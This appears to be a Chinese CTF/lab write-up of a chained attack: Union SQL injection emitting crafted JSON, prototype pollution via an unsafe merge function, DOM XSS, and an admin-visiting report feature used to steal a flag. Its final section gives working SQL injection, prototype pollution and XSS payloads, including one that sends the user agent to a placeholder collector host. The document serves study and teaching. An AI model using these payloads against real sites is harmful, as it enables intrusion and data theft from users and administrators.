# 案例：SQL 注入、原型污染与 DOM XSS 复合链

> 定位：靶场/公开案例复盘。重点学习跨后端、JSON 与前端渲染的数据流；示例载荷不得直接用于未授权系统。

## 一、漏洞整体复合利用链
服务端 Union SQL 注入 → 输出可控 JSON（带原型污染载荷） → 前端不安全 merge 函数触发原型污染 → 绕过渲染判断触发 DOM XSS → 利用举报功能诱导管理员访问，窃取 Flag
多层漏洞串联，单一漏洞无法拿到目标数据，必须完整组合利用。
二、各环节漏洞成因与作用
1. 后端：poi.php 联合 SQL 注入
地图边界参数lng_ub/lng_lb直接拼接 SQL，无预编译防护；
MySQL JSON_OBJECT() 可在查询结果里输出自定义 JSON 字符串；
攻击者自定义点位数据：一处字段放 XSS 代码，一处 meta 字段存放{"__proto__":{"isHtml":"true"}}原型污染载荷。
2. 前端核心漏洞：递归 merge 原型污染
不安全合并函数未过滤__proto__、constructor 原型关键字：
javascript
运行
function merge(dest, src) {
  for (let attr in src) {
    if (isObject(src[attr])) merge(dest[attr], src[attr]);
    else dest[attr] = src[attr];
  }
}
注入的 meta JSON 会污染全局Object.prototype.isHtml = true；
页面所有点位对象自动多出isHtml属性，原生无过滤。
3. DOM XSS 触发条件
页面存在渲染分支判断：
javascript
运行
point.isHtml ? $("#poi-desc").html(内容) : $("#poi-desc").text(内容)
正常点位无isHtml，使用安全文本渲染；
原型污染后恒为 true，调用危险.html()，执行注入的<script>/img onerror载荷。
4. 提权载体：Report 举报功能
页面report.php接收用户提交的页面哈希 URL，后台管理员会自动访问该链接；
普通用户 XSS 只能读取自己数据，诱导管理员打开恶意页面后，可读取管理员 UA/Cookie 内的 Flag。
三、完整利用步骤
构造注入 URL：将 Union SQL 语句写入 URL Hash 的边界参数；
浏览器加载页面，前端 AJAX 请求 poi.php，获取攻击者自定义 JSON 点位数据；
merge 合并 meta 中的__proto__载荷，污染全局原型；
哈希参数指定打开恶意点位，进入 html 渲染分支，XSS 执行；
XSS 脚本把页面数据 / UA 发送到攻击者接收地址；
通过页面 Report 功能提交恶意链接给管理员，拿到 Flag。
四、核心 Payload 拆分
SQL 注入片段：
sql
false union select 'bruh',2,3,'<img src=x onerror=fetch("回源地址")>',1,JSON_OBJECT("__proto__",JSON_OBJECT("isHtml","true")) --
原型污染载荷：{"__proto__":{"isHtml":"true"}}
XSS 窃取载荷：<img src=x onerror='new Image().src="https://xxx/?data="+navigator.userAgent'>
